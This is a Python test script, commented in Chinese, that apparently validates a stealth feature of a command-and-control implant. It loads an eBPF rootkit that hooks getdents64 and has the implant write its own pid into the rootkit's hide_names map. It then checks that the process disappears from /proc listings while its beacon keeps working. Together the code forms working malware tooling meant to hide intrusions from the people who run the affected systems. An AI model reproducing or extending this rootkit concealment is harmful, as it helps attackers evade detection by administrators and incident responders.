#!/usr/bin/env python3
"""B10 验收：把自身 pid 写进 rootkit `hide_names` → `/proc` 枚举里不可见（方案 §3.4 B10 / 门 S2）

背景：P1 之后 agent 的 comm/cmdline/cwd/exe 都不再泄漏（p11 覆盖），但 **/proc 的目录项
本身（纯数字 pid）仍然一一列出** —— 对手一条 `ls /proc` 就能看出"多了一个进程"。
`hide_names` 是唯一能改这件事的机制（挡 getdents64 枚举），B10 让 agent 自己把 pid 写进去。

B10 实现 = 启动期扫 /sys/fs/bpf/*_map0 → `BPF_OBJ_GET_INFO_BY_FD` 认身份
（type=HASH 且 key_size=64 且 value_size=1，即 hide_names 的 map 定义）→
缺失则 `BPF_MAP_UPDATE_ELEM` 写自身 pid 十进制串（key NUL 填充到满 64，value=1）。

  T0  阳性对照：**先于 rootkit 启动**的 agent，其 pid 在 /proc 枚举里可见（观测手段有效，ISS-020）
  T1  被测进程确实活着：/proc/<pid>/status 直接路径可读
      （否则 T2 可能是"进程已经死了"的假阳性 —— 这条是 T2 的守门人）
  T2  B10 生效：**同一次枚举**里没有 pidA1（门 S2）
  T2b 选择性：同一次枚举里 pidA0 仍在（证明是过滤生效，不是观测坏了）
  T3  边界：hide_names 只挡枚举、不挡 open —— /proc/<pid>/comm 仍可读（陷阱 1，记录用）
  T4  误伤面：/tmp 下与 pid 同名的文件同样从枚举里消失（已知代价，断言并记录）
  T5  回归：beacon 仍通

两条"测法本身必须做对"的前提（不是断言，错了就得到假结果）：

  * **CPU 固定到 0**：hide 的 perf_event attach 是 (pid=-1, cpu=0)，只覆盖 CPU 0
    （本机 2 核，gap10 已量出这个缺陷）。不固定 CPU，枚举落在 CPU 1 上，
    rootkit 根本不参与 → 得到的是**假 FAIL**。故进程启动即 setaffinity({0})。
  * **rootkit 必须先于被测 agent 加载**：B10 在 agent **启动期**执行一次；
    启动时 pin 不存在就什么都不写。所以顺序必须是 先 load → 再 gen/launch A1。
    （A0 是"rootkit 之前就在跑"的对照进程，正好用来做 T0/T2b 的参照物。）
"""
import os
import signal
import sys
import time

sys.path.insert(0, os.path.dirname(os.path.abspath(__file__)))
import e2e
import gap10_rootkit_verify as g10            # send_bof / pack_load / pack_unload / bof_texts
import p03_hide_link_verify as p03            # run_bof：param_data 精确字节 + 按 a_task_id 等 107

PIN = "axp13"
LISTENER = "TestHTTP"
R = []


def rec(item, ok, note=""):
    R.append(bool(ok))
    print("  [%-4s] %-52s %s" % ("PASS" if ok else "FAIL", item, note), flush=True)


def proc_list():
    """枚举 /proc 的目录项名 —— 就是 `ls /proc` 的观测，也是 hide 的作用面。"""
    try:
        return set(os.listdir("/proc"))
    except OSError:
        return set()


def alive(pid):
    """进程存在性：直接路径可读即可（hide 只挡枚举，不挡 open）。"""
    try:
        with open("/proc/%d/status" % pid) as f:
            return f.readline().strip()
    except OSError:
        return ""


def getuid_ok(aid, timeout=45):
    """发一条 getuid 并等 type=107 回执含 uid= —— 复用 p03 的 task 行读取。"""
    try:
        base = p03.max_id(aid)
        e2e.send_raw(aid, "getuid")
        t0 = time.time()
        while time.time() - t0 < timeout:
            for r in p03._rows(aid, base):
                if r.get("type") == 107 and "uid=" in str(r.get("a_text", "")):
                    return True
            time.sleep(1)
    except Exception as e:
        print("[warn] getuid: %s" % e, flush=True)
    return False


def kill(pid):
    if pid:
        try:
            os.kill(pid, signal.SIGKILL)   # 按 pid 杀；载荷 cmdline 是伪装名，-f 匹配会误伤（ISS-011）
        except OSError:
            pass


def main():
    # ── 前提 1：CPU 固定（见 docstring；不固定会得到假 FAIL）──
    try:
        os.sched_setaffinity(0, {0})
    except OSError as e:
        print("[warn] setaffinity 失败：%s" % e, flush=True)
    print("[env] 观测进程 CPU 亲和 = %s（hide 只挂 CPU 0）"
          % sorted(os.sched_getaffinity(0)), flush=True)

    pid0 = pid1 = None
    tmpfile = None
    a0 = a1 = None
    try:
        # ── 准备 A0：rootkit **之前**启动的对照进程 ──────────────────────
        bin0 = e2e.gen_agent(LISTENER, "p13a0")
        pid0 = e2e.launch(bin0)
        a0 = e2e.wait_registered(LISTENER, pid0, timeout=90)
        print("[env] A0 aid=%s pid=%d（rootkit 之前启动）" % (a0, pid0), flush=True)

        # ── 前提 2：加载 rootkit（hide 模块，pin = PIN）───────────────────
        p03.run_bof(a0, "ebpf_load", g10.pack_load(
            "%s/hide.insns.bin" % g10.BPF_OUT, "%s/hide.mapreloc.txt" % g10.BPF_OUT,
            5, 1, "syscalls/sys_exit_getdents64", "", "", b"", PIN))
        txt = ""
        for _ in range(30):
            time.sleep(3)
            txt = "\n".join(g10.bof_texts(a0, 3))
            if "attach" in txt or "failed" in txt:
                break
        ok_load = ("failed" not in txt) and ("attach" in txt or "cpus=" in txt)
        rec("T-load rootkit hide 模块已加载 (pin=%s)" % PIN, ok_load,
            (txt.strip().splitlines() or [""])[-1][:60])
        if not ok_load:
            print("[abort] rootkit 未加载，B10 无从生效", flush=True)
            return 1

        # ── T0：阳性对照 —— A0 的 pid 在枚举里可见 ──────────────────────
        pl = proc_list()
        rec("T0 阳性对照：A0 pid 在 /proc 枚举中可见", str(pid0) in pl,
            "枚举 %d 项" % len(pl))

        # ── 被测 A1：rootkit **之后**启动 → 启动期 B10 应把自己写进 hide_names ──
        bin1 = e2e.gen_agent(LISTENER, "p13a1")
        pid1 = e2e.launch(bin1)
        a1 = e2e.wait_registered(LISTENER, pid1, timeout=90)
        print("[env] A1 aid=%s pid=%d（rootkit 之后启动 → B10 应在启动期执行）" % (a1, pid1),
              flush=True)
        time.sleep(3)   # 给 B10 落定

        # ── T1：被测进程活着（T2 的守门人）──────────────────────────────
        st = alive(pid1)
        rec("T1 A1 进程确实活着（直接路径可读）", st.startswith("Name:"), st[:40])

        # ── T2 / T2b：B10 生效且是选择性过滤 ────────────────────────────
        pl1 = proc_list()
        rec("T2 B10：A1 pid 不在 /proc 枚举中（门 S2）", str(pid1) not in pl1,
            "枚举 %d 项" % len(pl1))
        rec("T2b 选择性：同一次枚举里 A0 pid 仍在", str(pid0) in pl1)

        # ── T3：边界 —— 只挡枚举不挡 open（陷阱 1）──────────────────────
        try:
            comm = open("/proc/%d/comm" % pid1).read().strip()
        except OSError:
            comm = ""
        rec("T3 边界：/proc/<pid>/comm 直接路径仍可读（仅挡枚举）", comm != "", comm)

        # ── T4：误伤面 —— 与 pid 同名的文件名同样被隐藏 ─────────────────
        tmpfile = "/tmp/%d" % pid1
        with open(tmpfile, "w") as f:
            f.write("p13\n")
        vis = os.path.basename(tmpfile) in set(os.listdir("/tmp"))
        rec("T4 误伤面：/tmp/<pid> 同名文件也被隐藏（已知代价）", not vis,
            "hide_names 无目录限定 → 同名 dirent 一并消失")

        # ── T5：回归 —— beacon 仍通 ─────────────────────────────────────
        rec("T5 回归：A1 beacon 仍通（getuid 回执）", getuid_ok(a1))

        return 0 if all(R) else 1
    finally:
        # ── 清场：unload rootkit → 删临时文件 → 按 pid 杀两个 agent ──────
        if a0:
            try:
                p03.run_bof(a0, "ebpf_unload", g10.pack_unload(PIN))
            except Exception as e:
                print("[warn] unload: %s" % e, flush=True)
        if tmpfile:
            try:
                os.remove(tmpfile)
            except OSError:
                pass
        kill(pid1)
        kill(pid0)
        print("\n[warn] 台面 = %d/%d" % (sum(R), len(R)), flush=True)


if __name__ == "__main__":
    sys.exit(main())
